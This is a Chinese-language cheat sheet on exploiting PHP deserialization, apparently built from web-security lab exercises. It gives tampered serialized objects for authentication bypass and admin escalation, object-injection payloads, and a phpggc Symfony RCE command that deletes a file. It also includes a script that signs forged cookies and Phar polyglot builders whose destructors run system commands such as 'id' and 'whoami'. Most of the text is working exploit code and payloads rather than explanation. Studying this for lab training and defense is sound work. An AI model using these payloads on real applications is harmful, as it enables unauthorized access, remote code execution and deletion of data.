# PHP反序列化漏洞

## 身份验证绕过

1.修改序列化对象

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
|
v
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

2.修改序列化数据类型

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"in7rgz2b9qn9o6v0a072flcqamyacqgd";}
|
v
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

## 对象注入

/libs/CustomTemplate.php~
```
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

Payload:
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

易受攻击的代码：
```php
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

Payload:
```
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

数组：
```
a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
```

## 预构建的小工具链

[phpggc](https://github.com/ambionics/phpggc)

```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```

des.php
```php
<?php
$object = "phpggc生成的有效负载";
$secretKey = "加密密钥";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

在PHP源代码中查找unserialize()函数或魔术方法：

+ __construct()
+ __destruct()
+ __call()
+ __callStatic()
+ __get()
+ __set()
+ __isset()
+ __unset()
+ __sleep()
+ __wakeup()
+ __serialize()
+ __unserialize()
+ __toString()
+ __invoke()
+ __set_state()
+ __clone()
+ __debugInfo()

## 自定义小工具链

/cgi-bin/libs/CustomTemplate.php~
```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

Payload:
```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

## Phar反序列化

vuln.php
```php
<?php
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }

    function __destruct() {
        system($this->data);
    }
}

//使用file_exists来触发反序列化
file_exists("phar://test.phar");
?>
```

create_phar.php
```php
<?php

class AnyClass {
	public $data = null;
	public function __construct($data) {
		$this->data = $data;
	}

	function __destruct() {
		system($this->data);
	}
}

//生成一个新的Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

//添加类作为对象
$object = new AnyClass('id');
$phar->setMetadata($object);
$phar->stopBuffering();
```

```bash
php --define phar.readonly=0 create_phar.php
```

### Phar的其它类型

PDF
```php
<?php
class PDFGenerator { }

//Create a new instance of the Dummy class and modify its property
$dummy = new PDFGenerator();
$dummy->callback = "passthru";
$dummy->fileName = "uname -a > pwned"; //our payload

// Delete any existing PHAR archive with that name
@unlink("poc.phar");

// Create a new archive
$poc = new Phar("poc.phar");

// Add all write operations to a buffer, without modifying the archive on disk
$poc->startBuffering();

// Set the stub
$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

/* Add a new file in the archive with "text" as its content*/
$poc["file"] = "text";
// Add the dummy object to the metadata. This will be serialized
$poc->setMetadata($dummy);
// Stop buffering and write changes to disk
$poc->stopBuffering();
?>
```

JPEG
```php
<?php
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }

    function __destruct() {
        system($this->data);
    }
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```
